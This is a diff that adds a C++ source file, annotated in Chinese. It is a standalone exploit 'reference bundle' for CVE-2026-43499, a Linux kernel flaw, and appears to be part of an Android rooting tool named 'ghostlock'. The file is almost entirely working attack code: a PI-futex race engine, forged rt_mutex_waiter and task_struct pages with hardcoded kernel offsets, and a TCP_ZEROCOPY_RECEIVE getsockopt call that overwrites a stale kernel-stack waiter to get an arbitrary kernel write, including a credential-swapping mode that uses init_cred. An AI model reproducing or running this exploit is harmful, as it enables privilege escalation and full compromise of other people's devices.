@@ -1,0 +1,640 @@
+/* ============================================================================
+ * CVE-2026-43499 核心攻击步骤 —— tcp_zerocopy route 单文件参考包
+ *
+ * 用途：把 backend/cve_2026_43499/route/tcp_zerocopy_route.cpp 的
+ * 「getsockopt(TCP_ZEROCOPY_RECEIVE) 把 zc 结构体拷到内核栈、覆盖陈旧
+ *  rt_mutex_waiter → 触发 PI 链 walk 完成擦除式写入」逻辑，连同 PI-futex
+ * 竞争引擎与 fake 页布局，拼成一条自包含流程；去掉 pipeline/route_policy/
+ * route_lifecycle/middleware/profile 等上层结构。
+ *
+ * 本文件仅供参考，不参与构建。原语总览同 multicast 文件：
+ *   预备(fake 页) → PI 竞争骨架(waiter/owner/consumer) → 覆盖陈旧 waiter →
+ *   consumer 触发 PI fixup → rb_erase 把 value 写进 target。
+ *
+ * TCP 特有：
+ *   - 用 loopback TCP 连接 + 一个 16MiB 的 memfd 作 zerocopy 落地；
+ *   - 后台 punch 线程反复 fallocate(FILL)+PUNCH_HOLE，制造可被 zerocopy 命中的页；
+ *   - zc[0x28]=waiter->task(=init_task 的 phys 别名)、zc[0x30]=fake_lock；
+ *   - 前 arm_sequence 次只做“拷贝落栈”，之后才放开 consumer；
+ *   - fallocate/punch 失败是 fail-closed（不留陈旧页）。
+ * ========================================================================== */
+
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <linux/falloc.h>
+#include <linux/futex.h>
+#include <pthread.h>
+#include <time.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+#include <algorithm>
+#include <array>
+#include <atomic>
+#include <cerrno>
+#include <cstddef>
+#include <cstdint>
+#include <cstdio>
+#include <cstring>
+
+namespace glk43499 {
+
+    // ========================================================================
+    // 0. 偏移 / 参数
+    // ========================================================================
+    namespace off {
+        // --- 内核地址布局 ---
+        inline constexpr std::uintptr_t kImageTextBase = 0xffffffc080000000ULL;
+        inline constexpr std::uintptr_t kDirectMapBase = 0xffffff8000000000ULL;
+        inline constexpr std::uintptr_t kDirectMapEnd  = 0xffffff9000000000ULL;
+
+        // --- fake 页槽位（相对 payload 页基址）---
+        inline constexpr std::size_t kLockOff      = 0x0e80;
+        inline constexpr std::size_t kWaiterOff    = 0x1180;
+        inline constexpr std::size_t kFopsOff      = 0x0f80;
+        inline constexpr std::size_t kRightOff     = 0x1240;
+        inline constexpr std::size_t kLeftOff      = 0x1260;
+        inline constexpr std::size_t kFakeTaskOff  = 0x1280;
+        inline constexpr std::size_t kCredCopyOff  = 0x1080;
+        // TCP 专用：fake_task 放到 0x5800，避开 fake_lock 的 rb_leftmost 区；
+        // cred copy 其后，避免 0x1080 落进 fake_task 内部。
+        inline constexpr std::size_t kTcpFakeTaskOff = 0x5800;
+        inline constexpr std::size_t kTcpCredCopyOff = 0x6800;
+
+        // --- fake rt_mutex_waiter 字段 ---
+        inline constexpr std::size_t kWaiterTaskOff = 0x50;
+        inline constexpr std::size_t kWaiterLockOff = 0x58;
+        inline constexpr std::size_t kWaiterPrioOff = 0x44;
+
+        // --- fake task_struct 字段 ---
+        inline constexpr std::size_t kTaskUsageOff      = 0x40;
+        inline constexpr std::size_t kTaskPrioOff       = 0x84;
+        inline constexpr std::size_t kTaskNormalPrioOff = 0x8c;
+        inline constexpr std::size_t kTaskGroupOff      = 0x348;
+        inline constexpr std::size_t kTaskPiLockOff     = 0x90c;
+        inline constexpr std::size_t kTaskPiWaitersOff  = 0x920;
+        inline constexpr std::size_t kTaskPiTopOff      = 0x930;
+        inline constexpr std::size_t kTaskPiBlockedOff  = 0x938;
+
+        inline constexpr std::int32_t kFakeTaskPrio   = 120;
+        inline constexpr std::int32_t kFakeWaiterPrio = 140;
+
+        // --- 符号偏移 ---
+        inline constexpr std::uintptr_t kInitTaskOff      = 0x0211e280ULL;
+        inline constexpr std::uintptr_t kInitCredOff      = 0x02130748ULL;
+        inline constexpr std::uintptr_t kRootTaskGroupOff = 0x02317580ULL;
+
+        // --- TCP route 参数 ---
+        inline constexpr std::size_t kPunchShmemLen = 16U * 1024U * 1024U;  // 16MiB memfd
+        inline constexpr int         kTcpZerocopyReceive = 61;  // TCP_ZEROCOPY_RECEIVE
+        inline constexpr std::int32_t kTcpAttempts     = 64;    // 原 profile.tcp_attempts()
+        inline constexpr std::uint32_t kTcpArmSequence = 4;     // 原 profile.tcp_arm_sequence()
+        inline constexpr std::uint32_t kTcpPostHold    = 20000; // 原 profile.tcp_post_receive_hold_iterations()
+
+        // --- zc 结构体在内核栈上的写入字偏移（覆盖陈旧 waiter）---
+        inline constexpr std::size_t kZcSize       = 0x40;
+        inline constexpr std::size_t kZcAddressOff = 0x18;  // zerocopy 目标地址
+        inline constexpr std::size_t kZcLenOff     = 0x20;  // 长度
+        inline constexpr std::size_t kZcTaskOff    = 0x28;  // == waiter->task
+        inline constexpr std::size_t kZcLockOff    = 0x30;  // == waiter->lock
+
+        // --- 竞争引擎默认 ---
+        inline constexpr int32_t kRaceRouteWaitMs        = 1000;
+        inline constexpr int32_t kConsumerBurstCalls     = 1;
+        inline constexpr int32_t kConsumerMaxCalls       = 100000;
+    } // namespace off
+
+    enum class WriteMode : int32_t { Disabled = 0, Zero = 1, Credential = 2 };
+    struct WriteRequest {
+        std::uintptr_t target = 0;
+        WriteMode mode = WriteMode::Disabled;
+        bool preserve_child = false;
+    };
+    enum class RouteResultCode : int32_t { Ok = 0, Retryable, FallbackSafe, DirtyFailure, Unsupported };
+    struct RouteStatus {
+        RouteResultCode code = RouteResultCode::Retryable;
+        int32_t step = 0;
+        int32_t error_number = 0;
+        int32_t userspace_clean = 0;
+        int32_t kernel_disarmed = 0;
+        int32_t consumer_calls = 0;
+        int32_t consumer_successes = 0;
+        int32_t getsockopt_ret = 0;
+        int32_t getsockopt_errno = 0;
+        int32_t zc_copies = 0;
+    };
+
+    // ========================================================================
+    // 1. syscall 包装
+    // ========================================================================
+    inline long futex_op(std::uint32_t *uaddr, int op, std::uint32_t val,
+                         const void *timeout, std::uint32_t *uaddr2,
+                         std::uint32_t val3) noexcept {
+        return ::syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
+    }
+    struct sched_attr {
+        std::uint32_t size; std::uint32_t sched_policy; std::uint64_t sched_flags;
+        std::int32_t sched_nice; std::uint32_t sched_priority;
+        std::uint64_t sched_runtime, sched_deadline, sched_period;
+    };
+    inline long sched_setattr_tid(std::int32_t tid, std::int32_t nice) noexcept {
+        struct sched_attr attr{};
+        attr.size = sizeof(attr);
+        attr.sched_nice = nice;
+        return ::syscall(SYS_sched_setattr, tid, &attr, 0);
+    }
+
+    // ========================================================================
+    // 2. PI-futex 竞争引擎（同 multicast 文件，逐字对应 race/threads.cpp）
+    // ========================================================================
+    struct FakePage {
+        std::uintptr_t base = 0, fake_lock = 0, fake_w0 = 0, fake_task = 0;
+        std::uintptr_t fake_parent = 0, fake_right = 0, fake_left = 0, fake_fops = 0;
+        std::uintptr_t waiter_task = 0;
+        std::uintptr_t task_group = 0;
+    };
+    struct PiRace {
+        std::uint32_t wait_futex = 0, target_futex = 0, chain_futex = 0;
+        std::atomic<std::int32_t> waiter_ready{0}, waiter_waiting{0}, owner_started{0},
+            owner_chain_done{0}, owner_stop{0}, route_done{0}, waiter_tid{0},
+            consumer_go{0}, consumer_stop{0}, consumer_calls{0}, consumer_success{0},
+            consumer_inflight{0};
+        std::atomic<std::uint32_t> route_delay_usec{0};
+        pthread_t waiter_thread{}, owner_thread{}, consumer_thread{};
+        const WriteRequest *request = nullptr;
+        FakePage fake{};
+        RouteStatus route_status{};
+    };
+
+    RouteStatus run_this_route(PiRace *race, const WriteRequest *request) noexcept;
+
+    namespace engine {
+        void *waiter_entry(void *arg) noexcept {
+            auto *race = static_cast<PiRace *>(arg);
+            race->waiter_tid.store(static_cast<std::int32_t>(::syscall(SYS_gettid)));
+            // 分支：先在 chain_futex 上拿 PI 锁（PI 链里 waiter 的一环）；失败仅告警。
+            if (futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0) != 0) {
+                std::fprintf(stderr, "[!] waiter lock chain errno=%d\n", errno);
+            }
+            race->waiter_ready.store(1);
+            while (!race->owner_started.load()) ::usleep(100);
+            struct timespec timeout{};
+            ::clock_gettime(CLOCK_MONOTONIC, &timeout);
+            timeout.tv_sec += off::kRaceRouteWaitMs / 1000;
+            race->waiter_waiting.store(1);
+            // 挂到 wait_futex；返回后内核栈遗留陈旧 waiter，交给本 route 覆盖。
+            (void)futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+                           &race->target_futex, 0);
+            race->route_status = run_this_route(race, race->request);
+            race->route_done.store(1);
+            (void)futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
+            while (!race->owner_chain_done.load()) ::usleep(100);
+            return nullptr;
+        }
+        void *owner_entry(void *arg) noexcept {
+            auto *race = static_cast<PiRace *>(arg);
+            const long locked = futex_op(&race->target_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
+            // 分支：拿 target PI 锁失败，仅告警继续。
+            if (locked != 0) std::fprintf(stderr, "[!] owner lock target errno=%d\n", errno);
+            while (!race->waiter_ready.load() && !race->owner_stop.load()) ::usleep(100);
+            // 分支：启动失败 → owner 解锁退出。
+            if (race->owner_stop.load()) {
+                if (locked == 0) (void)futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
+                return nullptr;
+            }
+            race->owner_started.store(1);
+            (void)futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
+            race->owner_chain_done.store(1);
+            while (!race->owner_stop.load()) ::sleep(1);
+            // 分支：只有先前真拿到了 target 锁才需要解锁。
+            if (locked == 0) (void)futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
+            return nullptr;
+        }
+        void *consumer_entry(void *arg) noexcept {
+            auto *race = static_cast<PiRace *>(arg);
+            std::int32_t seen = 0;
+            while (!race->consumer_stop.load()) {
+                const std::int32_t seq = race->consumer_go.load();
+                // 分支：无新序列或已处理 → 让出 CPU。
+                if (seq == 0 || seq == seen) { __asm__ volatile("yield" ::: "memory"); continue; }
+                seen = seq;
+                const std::int32_t tid = race->waiter_tid.load();
+                std::int32_t calls_this_seq = 0;
+                while (!race->consumer_stop.load() && race->consumer_go.load() == seq) {
+                    const std::uint32_t delay = race->route_delay_usec.load();
+                    // 分支：TCP route 用 route_delay=0（立即触发 PI walk）。
+                    if (delay > 0) ::usleep(static_cast<useconds_t>(delay));
+                    for (std::uint32_t burst = 0; burst < static_cast<std::uint32_t>(off::kConsumerBurstCalls); ++burst) {
+                        // 分支：中途叫停或换序列 → 结束本序列。
+                        if (race->consumer_stop.load() || race->consumer_go.load() != seq) break;
+                        race->consumer_calls.fetch_add(1);
+                        race->consumer_inflight.store(1);
+                        errno = 0;
+                        const long sr = sched_setattr_tid(tid, (calls_this_seq % 19) + 1);
+                        // 分支：sched_setattr 失败 → 备用 PI 锁/解锁触发。
+                        if (sr != 0) {
+                            struct timespec ft{}; ft.tv_nsec = 50000000;
+                            const long fret = futex_op(&race->target_futex, FUTEX_LOCK_PI, 0, &ft, nullptr, 0);
+                            // 分支：备用锁成功即立刻解锁（完成一次触发尝试）。
+                            if (fret == 0) (void)futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
+                        }
+                        // 分支：触发成功才计 success。
+                        if (sr == 0) race->consumer_success.fetch_add(1);
+                        race->consumer_inflight.store(0);
+                        ++calls_this_seq;
+                        // 分支：达到序列调用上限 → 结束序列。
+                        if (calls_this_seq >= off::kConsumerMaxCalls) { race->consumer_go.store(0); break; }
+                    }
+                }
+            }
+            return nullptr;
+        }
+        RouteStatus run(PiRace &race) noexcept {
+            while (!race.waiter_waiting.load() || !race.owner_started.load()) ::usleep(100);
+            ::usleep(1000);
+            errno = 0;
+            const long rq = futex_op(&race.wait_futex, FUTEX_CMP_REQUEUE_PI, 1,
+                                     reinterpret_cast<void *>(1), &race.target_futex, 0);
+            std::fprintf(stderr, "[i] CMP_REQUEUE_PI ret=%ld errno=%d\n", rq, errno);
+            while (!race.route_done.load()) ::usleep(100);
+            RouteStatus st = race.route_status;
+            // 分支：Ok 但 consumer 未成功 → 降级为可重试。
+            if (st.code == RouteResultCode::Ok &&
+                (race.consumer_calls.load() == 0 || race.consumer_success.load() == 0)) {
+                st.code = RouteResultCode::Retryable;
+            }
+            return st;
+        }
+        void start(PiRace &race, const WriteRequest *request) noexcept {
+            race.request = request;
+            pthread_create(&race.consumer_thread, nullptr, consumer_entry, &race);
+            pthread_create(&race.owner_thread, nullptr, owner_entry, &race);
+            pthread_create(&race.waiter_thread, nullptr, waiter_entry, &race);
+        }
+        void stop_and_join(PiRace &race) noexcept {
+            race.consumer_go.store(0);
+            race.consumer_stop.store(1);
+            race.owner_stop.store(1);
+            pthread_join(race.waiter_thread, nullptr);
+            pthread_join(race.owner_thread, nullptr);
+            pthread_join(race.consumer_thread, nullptr);
+        }
+    } // namespace engine
+
+    // ========================================================================
+    // 3. 擦除式写入 + fake 页（同 multicast 文件；这里用 TCP 专用槽位）
+    // ========================================================================
+    struct PageWriteLayout {
+        std::uintptr_t parent = 0, right = 0, left = 0, fops = 0;
+        bool needs_credential_copy = false;
+    };
+    inline void store64(std::uint8_t *p, std::size_t o, std::uint64_t v) noexcept { std::memcpy(p + o, &v, 8); }
+    inline void store32(std::uint8_t *p, std::size_t o, std::uint32_t v) noexcept { std::memcpy(p + o, &v, 4); }
+
+    inline PageWriteLayout payload_write_layout(const WriteRequest *request, std::uintptr_t page_base,
+                                                std::uintptr_t default_fops, std::uintptr_t credential_fops,
+                                                std::uintptr_t init_cred_alias) noexcept {
+        PageWriteLayout layout{};
+        layout.fops = default_fops;
+        // 分支：Disabled 请求不产生写入元组。
+        if (request == nullptr || request->mode == WriteMode::Disabled) return layout;
+        // 分支：非叶子布局用 right 携带值/别名。
+        if (request->preserve_child) {
+            layout.right = request->mode == WriteMode::Credential ? init_cred_alias : page_base + 0x100;
+        }
+        // 分支：Credential 模式换 fops 并标记拷凭据。
+        if (request->mode == WriteMode::Credential) {
+            layout.fops = credential_fops;
+            layout.needs_credential_copy = true;
+        }
+        layout.parent = request->target - 8;
+        return layout;
+    }
+    inline void encode_compact_waiter(std::uint8_t *waiter, const WriteRequest &request,
+                                      const PageWriteLayout &layout) noexcept {
+        // 分支：right!=0 → pc=value、left=target。
+        if (layout.right != 0) {
+            store64(waiter, 0x18, layout.right);
+            store64(waiter, 0x20, 0);
+            store64(waiter, 0x28, request.target);
+            return;
+        }
+        // 分支：叶子 → parent/right/left。
+        store64(waiter, 0x18, layout.parent);
+        store64(waiter, 0x20, layout.right);
+        store64(waiter, 0x28, layout.left);
+    }
+
+    inline void fill_fake_page_compact(std::uint8_t *page, const FakePage &fp,
+                                       const WriteRequest &request, const PageWriteLayout &layout) noexcept {
+        store32(page, off::kLockOff + 0x00, 0);
+        store64(page, off::kLockOff + 0x08, fp.fake_w0);
+        store64(page, off::kLockOff + 0x10, fp.fake_w0);
+        store64(page, off::kLockOff + 0x18, fp.fake_task | 1U);
+
+        store64(page, off::kWaiterOff + 0x00, 1);
+        store64(page, off::kWaiterOff + 0x08, 0);
+        store64(page, off::kWaiterOff + 0x10, 0);
+        encode_compact_waiter(page + off::kWaiterOff, request, layout);
+        store64(page, off::kWaiterOff + 0x30, fp.fake_task);
+        store64(page, off::kWaiterOff + 0x38, fp.fake_lock);
+        store32(page, off::kWaiterOff + 0x40, 0);
+        store32(page, off::kWaiterOff + off::kWaiterPrioOff, static_cast<std::uint32_t>(off::kFakeWaiterPrio));
+        store64(page, off::kWaiterOff + 0x48, 0);
+        store64(page, off::kWaiterOff + 0x50, 0);
+
+        // TCP 布局：fake_task 落在 0x5800。
+        store32(page, off::kTcpFakeTaskOff + off::kTaskUsageOff, 0x100);
+        store32(page, off::kTcpFakeTaskOff + off::kTaskPrioOff, static_cast<std::uint32_t>(off::kFakeTaskPrio));
+        store32(page, off::kTcpFakeTaskOff + off::kTaskNormalPrioOff, static_cast<std::uint32_t>(off::kFakeTaskPrio));
+        store32(page, off::kTcpFakeTaskOff + off::kTaskPiLockOff, 0);
+        store64(page, off::kTcpFakeTaskOff + off::kTaskPiWaitersOff, 0);
+        store64(page, off::kTcpFakeTaskOff + off::kTaskPiWaitersOff + 0x08, 0);
+        store64(page, off::kTcpFakeTaskOff + off::kTaskGroupOff, fp.task_group);
+        store64(page, off::kTcpFakeTaskOff + off::kTaskPiTopOff, fp.waiter_task);
+        store64(page, off::kTcpFakeTaskOff + off::kTaskPiBlockedOff, 0);
+    }
+
+    // ========================================================================
+    // 4. tcp_zerocopy route
+    // ========================================================================
+    struct TcpRoute {
+        PiRace *race = nullptr;
+        const WriteRequest *request = nullptr;
+        FakePage fake{};
+        std::int32_t client_fd = -1, server_fd = -1, punch_fd = -1;
+        void *mapping = nullptr;
+        std::size_t mapping_length = off::kPunchShmemLen;
+        std::size_t page_size = 0;
+        pthread_t punch_worker{};
+        std::atomic<std::int32_t> punch_go{0}, punch_stop{0}, punch_phase{0}, punch_failed{0};
+        std::int32_t route_won = 0;
+        RouteStatus status{};
+
+        std::int32_t fail(std::int32_t step, std::int32_t err) noexcept {
+            status.step = step; status.error_number = err; return -1;
+        }
+
+        // 后台 punch：反复 fill + PUNCH_HOLE，让目标页保持可被 zerocopy 命中。
+        static void *punch_body(void *arg) noexcept {
+            auto *self = static_cast<TcpRoute *>(arg);
+            while (!self->punch_go.load() && !self->punch_stop.load()) ::sched_yield();
+            while (!self->punch_stop.load()) {
+                // 分支：整文件 fill 失败 → 记错误退出。
+                if (::fallocate(self->punch_fd, 0, 0, static_cast<off_t>(self->mapping_length)) != 0) {
+                    self->punch_failed.store(errno ? errno : EIO);
+                    break;
+                }
+                self->punch_phase.store(1);
+                // 分支：从第二页起打洞；失败则目标页保留陈旧内容（记错但循环继续）。
+                if (::fallocate(self->punch_fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
+                                static_cast<off_t>(self->page_size),
+                                static_cast<off_t>(self->mapping_length - self->page_size)) != 0) {
+                    self->punch_failed.store(errno ? errno : EIO);
+                }
+                self->punch_phase.store(0);
+                // 分支：已记错 → 停止 punch。
+                if (self->punch_failed.load()) break;
+            }
+            return nullptr;
+        }
+
+        // 建 loopback TCP 连接对。
+        std::int32_t make_pair() noexcept {
+            const std::int32_t listener = ::socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+            // 分支：listener 建立失败。
+            if (listener < 0) return -1;
+            std::int32_t one = 1;
+            ::setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+            sockaddr_in addr{};
+            addr.sin_family = AF_INET;
+            addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+            addr.sin_port = 0;
+            // 分支：bind/listen 失败 → 关 listener 返回。
+            if (::bind(listener, reinterpret_cast<sockaddr *>(&addr), sizeof(addr)) != 0 ||
+                ::listen(listener, 1) != 0) {
+                ::close(listener); return -1;
+            }
+            socklen_t len = sizeof(addr);
+            // 分支：取回真实端口失败。
+            if (::getsockname(listener, reinterpret_cast<sockaddr *>(&addr), &len) != 0) {
+                ::close(listener); return -1;
+            }
+            client_fd = ::socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+            // 分支：client 建立失败。
+            if (client_fd < 0) { ::close(listener); return -1; }
+            // 分支：connect 失败 → 关 client/listener。
+            if (::connect(client_fd, reinterpret_cast<sockaddr *>(&addr), sizeof(addr)) != 0) {
+                ::close(client_fd); client_fd = -1; ::close(listener); return -1;
+            }
+            server_fd = ::accept4(listener, nullptr, nullptr, SOCK_CLOEXEC);
+            ::close(listener);
+            // 分支：accept 失败 → 关 client。
+            if (server_fd < 0) { ::close(client_fd); client_fd = -1; return -1; }
+            return 0;
+        }
+
+        // prepare：拿到全部用户态资源，未返回 0 前绝不 arm。
+        std::int32_t prepare() noexcept {
+            const FakePage &page = fake;   // Kotlin-owned fake page
+            // 分支：fake 页关键地址缺失 → 失败。
+            if (page.base == 0 || page.fake_lock == 0 || page.fake_fops == 0) return fail(40, 0);
+            // 分支：TCP 连接对建立失败。
+            if (make_pair() != 0) return fail(41, errno);
+            page_size = static_cast<std::size_t>(::sysconf(_SC_PAGESIZE));
+            punch_fd = static_cast<std::int32_t>(::syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC));
+            // 分支：memfd 或 fallocate 失败。
+            if (punch_fd < 0 || ::fallocate(punch_fd, 0, 0, static_cast<off_t>(mapping_length)) != 0) {
+                return fail(42, errno);
+            }
+            mapping = ::mmap(nullptr, mapping_length, PROT_READ | PROT_WRITE, MAP_SHARED, punch_fd, 0);
+            // 分支：mmap 失败。
+            if (mapping == MAP_FAILED) { mapping = nullptr; return fail(43, errno); }
+            auto *bytes = static_cast<unsigned char *>(mapping);
+            for (std::size_t o = 0; o < mapping_length; o += page_size) bytes[o] = 0x55;
+            race->consumer_stop.store(0);
+            race->consumer_go.store(0);
+            race->consumer_calls.store(0);
+            race->consumer_success.store(0);
+            // 分支：punch 线程创建失败。
+            if (pthread_create(&punch_worker, nullptr, punch_body, this) != 0) return fail(44, errno);
+            return 0;
+        }
+
+        // execute：getsockopt 覆盖陈旧 waiter + arm consumer。
+        RouteStatus execute() noexcept {
+            const std::uintptr_t waiter_task = fake.waiter_task;
+            if (waiter_task == 0U) { (void)fail(40, 0); return status; }
+            const std::uint32_t arm_seq = off::kTcpArmSequence;
+            const std::uint32_t post_hold = off::kTcpPostHold;
+            const std::int32_t attempts = off::kTcpAttempts;
+            punch_go.store(1);
+            race->route_delay_usec.store(0);   // custom-write：立即 PI walk
+
+            std::array<unsigned char, 64> sendbuf{};
+            sendbuf.fill(0x33);
+
+            for (std::int32_t i = 1; i <= attempts && !route_won; ++i) {
+                const std::int32_t calls_before = race->consumer_calls.load();
+                const std::int32_t success_before = race->consumer_success.load();
+                (void)::send(server_fd, sendbuf.data(), sendbuf.size(), MSG_DONTWAIT);
+                while (punch_phase.load()) ::sched_yield();
+                for (std::int32_t spin = 0; !punch_phase.load() && !punch_failed.load() && spin < 10000000; ++spin) {
+                    __asm__ volatile("yield" ::: "memory");
+                }
+                // 分支：punch 线程报错 → 中止本 route。
+                if (punch_failed.load()) { (void)fail(46, punch_failed.load()); break; }
+
+                std::array<unsigned char, off::kZcSize> zc{};
+                store64(zc.data(), off::kZcAddressOff,
+                        reinterpret_cast<std::uint64_t>(static_cast<unsigned char *>(mapping) + page_size));
+                store32(zc.data(), off::kZcLenOff, static_cast<std::uint32_t>(sendbuf.size()));
+                store64(zc.data(), off::kZcTaskOff, waiter_task);   // == waiter->task
+                store64(zc.data(), off::kZcLockOff, fake.fake_lock); // == waiter->lock
+                socklen_t len = static_cast<socklen_t>(zc.size());
+                errno = 0;
+                const std::int32_t ret = ::getsockopt(client_fd, IPPROTO_TCP, off::kTcpZerocopyReceive,
+                                                      zc.data(), &len);
+                const std::int32_t saved_errno = errno;
+                status.getsockopt_ret = ret;
+                status.getsockopt_errno = saved_errno;
+                if (ret == 0) ++status.zc_copies;
+                // 分支：到达 arm_seq 且拷贝成功 → 放开 consumer 触发 PI fixup。
+                if (i >= static_cast<std::int32_t>(arm_seq) && ret == 0) {
+                    race->consumer_go.store(i);
+                    for (std::uint32_t spin = 0; spin < post_hold; ++spin) {
+                        __asm__ volatile("yield" ::: "memory");
+                    }
+                    while (race->consumer_inflight.load()) __asm__ volatile("yield" ::: "memory");
+                }
+                const std::int32_t calls = race->consumer_calls.load();
+                const std::int32_t success = race->consumer_success.load();
+                status.consumer_calls = calls;
+                status.consumer_successes = success;
+                // 分支：consumer 没有新调用/成功 → 本次未命中，继续下一次。
+                if (calls <= calls_before || success <= success_before) {
+                    (void)saved_errno;
+                    continue;
+                }
+                // consumer 触发过 → PI walk 解引用了伪造 waiter 并完成写入。
+                route_won = 1;
+                status.code = RouteResultCode::Ok;
+                status.step = 0; status.error_number = 0;
+            }
+            // 分支：多次尝试均未命中。
+            if (!route_won && status.step == 0) (void)fail(45, 0);
+            return status;
+        }
+
+        void disarm() noexcept {
+            race->consumer_go.store(0);
+            punch_go.store(0);
+            punch_stop.store(1);
+            while (race->consumer_inflight.load()) __asm__ volatile("yield" ::: "memory");
+            status.kernel_disarmed = 1;
+        }
+
+        void destroy() noexcept {
+            // 分支：punch 线程已启动才 join。
+            if (punch_worker) {
+                const int rc = pthread_join(punch_worker, nullptr);
+                // 分支：join 失败 → 标脏并保留资源（不回收可能仍在用的 fd）。
+                if (rc != 0) { (void)fail(47, rc); status.code = RouteResultCode::DirtyFailure; return; }
+                punch_worker = {};
+            }
+            // 分支：munmap 失败 → 标脏并保留资源。
+            if (mapping != nullptr) {
+                if (::munmap(mapping, mapping_length) != 0) {
+                    (void)fail(48, errno); status.code = RouteResultCode::DirtyFailure; return;
+                }
+                mapping = nullptr;
+            }
+            // 分支：逐个关闭自有 fd（>=0 才关）。
+            if (punch_fd >= 0) { ::close(punch_fd); punch_fd = -1; }
+            if (server_fd >= 0) { ::close(server_fd); server_fd = -1; }
+            // 分支：client fd 有效才关。
+            if (client_fd >= 0) { ::close(client_fd); client_fd = -1; }
+            status.userspace_clean = 1;
+            // 分支：竞态落败但内核已解除 → 归为可安全回退。
+            if (!route_won && status.kernel_disarmed) status.code = RouteResultCode::FallbackSafe;
+        }
+    };
+
+    inline RouteStatus run_this_route(PiRace *race, const WriteRequest *request) noexcept {
+        TcpRoute route;
+        route.race = race;
+        route.request = request;
+        route.fake = race->fake;
+        route.status.code = RouteResultCode::Retryable;
+        // 生命周期：prepare（成功才 execute）→ disarm → destroy。
+        // 分支：prepare 返回 0 才进入 execute。
+        if (route.prepare() == 0) (void)route.execute();
+        route.disarm();
+        route.destroy();
+        return route.status;
+    }
+
+    inline RouteStatus run_tcp_route(const WriteRequest &request, const FakePage &fake = {}) {
+        PiRace race{};
+        race.fake = fake;
+        engine::start(race, &request);
+        RouteStatus status = engine::run(race);
+        engine::stop_and_join(race);
+        return status;
+    }
+
+} // namespace glk43499
+
+// Thin C entry for the JNI edge; Kotlin owns the request values.
+extern "C" int ghostlock_tcp_zerocopy_run(std::uint64_t target, std::int32_t mode,
+                                         std::int32_t preserve_child,
+                                         const std::uint64_t *fake_values,
+                                         std::int32_t *out_status,
+                                         std::int32_t *out_step,
+                                         std::int32_t *out_errno,
+                                         std::int32_t *out_clean,
+                                         std::int32_t *out_disarmed,
+                                         std::int32_t *out_calls,
+                                         std::int32_t *out_successes,
+                                         std::int32_t *out_ret,
+                                         std::int32_t *out_get_errno,
+                                         std::int32_t *out_zc) noexcept {
+    if (out_status == nullptr || out_step == nullptr || out_errno == nullptr ||
+        out_clean == nullptr || out_disarmed == nullptr || out_calls == nullptr ||
+        out_successes == nullptr || out_ret == nullptr || out_get_errno == nullptr ||
+        out_zc == nullptr) return -1;
+    glk43499::WriteRequest request{};
+    request.target = static_cast<std::uintptr_t>(target);
+    request.mode = static_cast<glk43499::WriteMode>(mode);
+    request.preserve_child = preserve_child != 0;
+    glk43499::FakePage fake{};
+    if (fake_values != nullptr) {
+        fake.base = static_cast<std::uintptr_t>(fake_values[0]);
+        fake.fake_lock = static_cast<std::uintptr_t>(fake_values[1]);
+        fake.fake_w0 = static_cast<std::uintptr_t>(fake_values[2]);
+        fake.fake_task = static_cast<std::uintptr_t>(fake_values[3]);
+        fake.fake_parent = static_cast<std::uintptr_t>(fake_values[4]);
+        fake.fake_right = static_cast<std::uintptr_t>(fake_values[5]);
+        fake.fake_left = static_cast<std::uintptr_t>(fake_values[6]);
+        fake.fake_fops = static_cast<std::uintptr_t>(fake_values[7]);
+        fake.waiter_task = static_cast<std::uintptr_t>(fake_values[8]);
+        fake.task_group = static_cast<std::uintptr_t>(fake_values[9]);
+    }
+    const glk43499::RouteStatus status = glk43499::run_tcp_route(request, fake);
+    *out_status = static_cast<std::int32_t>(status.code);
+    *out_step = status.step;
+    *out_errno = status.error_number;
+    *out_clean = status.userspace_clean;
+    *out_disarmed = status.kernel_disarmed;
+    *out_calls = status.consumer_calls;
+    *out_successes = status.consumer_successes;
+    *out_ret = status.getsockopt_ret;
+    *out_get_errno = status.getsockopt_errno;
+    *out_zc = status.zc_copies;
+    return 0;
+}
